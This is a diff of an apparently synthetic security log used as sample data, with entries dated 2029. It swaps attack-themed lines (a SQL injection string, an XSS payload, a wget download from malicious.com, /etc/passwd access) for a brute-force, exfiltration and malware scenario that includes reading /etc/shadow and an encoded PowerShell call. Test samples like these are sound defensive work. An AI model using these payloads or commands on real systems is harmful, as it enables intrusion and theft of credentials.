@@ -1,12 +1,19 @@
-[2026-08-18 12:34:56] Failed login attempt for user 'admin' from IP 192.168.1.10
-[2026-08-18 12:34:57] Failed login attempt for user 'admin' from IP 192.168.1.10
-[2026-08-18 12:34:58] Failed login attempt for user 'admin' from IP 192.168.1.10
-[2026-08-18 13:45:23] SQL query error: SELECT * FROM users WHERE username='' OR '1'='1'; -- ' AND password='password'
-[2026-08-18 14:56:12] GET /login HTTP/1.1 User-Agent: Possible-Scanning-Bot/1.0
-[2026-08-18 15:23:45] GET /admin/dashboard HTTP/1.1 from IP 203.0.113.5
-[2026-08-18 16:34:12] Command executed: /bin/bash -c 'wget http://malicious.com/exploit.sh'
-[2026-08-18 17:45:23] GET /etc/passwd HTTP/1.1 from IP 192.168.1.20
-[2026-08-18 18:56:34] 1000 requests received from IP 192.168.1.30 in the last 60 seconds
-[2026-08-18 19:12:45] GET /search?q=<script>alert('XSS')</script> HTTP/1.1
-[2026-08-18 20:23:56] Connection attempt to port 4444 from IP 192.168.1.40
-[2026-08-18 21:34:12] GET /downloads/malicious.exe HTTP/1.1 from IP 192.168.1.50
+2029-01-15 10:23:45 [INFO] User admin logged in from 192.168.1.100
+2029-01-15 10:24:12 [INFO] File access: /etc/passwd by user admin
+2029-01-15 10:25:33 [WARN] Failed login attempt for user root from 203.0.113.45
+2029-01-15 10:25:45 [WARN] Failed login attempt for user root from 203.0.113.45
+2029-01-15 10:25:58 [WARN] Failed login attempt for user root from 203.0.113.45
+2029-01-15 10:26:12 [WARN] Failed login attempt for user admin from 203.0.113.45
+2029-01-15 10:26:25 [WARN] Failed login attempt for user admin from 203.0.113.45
+2029-01-15 10:27:01 [ERROR] Brute force attack detected from IP 203.0.113.45
+2029-01-15 10:27:15 [INFO] IP 203.0.113.45 blocked by firewall
+2029-01-15 10:30:22 [INFO] User admin executed sudo command: /bin/cat /etc/shadow
+2029-01-15 10:31:45 [WARN] Unusual network traffic detected to suspicious-domain.evil.com
+2029-01-15 10:32:10 [INFO] DNS query for suspicious-domain.evil.com from 192.168.1.100
+2029-01-15 10:33:22 [WARN] Large data transfer detected: 500MB to 198.51.100.25
+2029-01-15 10:35:15 [ERROR] Malware signature detected in file: /tmp/malicious_payload.exe
+2029-01-15 10:35:30 [INFO] File quarantined: /tmp/malicious_payload.exe
+2029-01-15 10:36:45 [WARN] Process spawned with suspicious arguments: powershell.exe -enc <base64_encoded_command>
+2029-01-15 10:37:12 [INFO] User admin logged out
+2029-01-15 10:45:33 [INFO] System backup completed successfully
+2029-01-15 11:00:15 [INFO] Regular system maintenance started
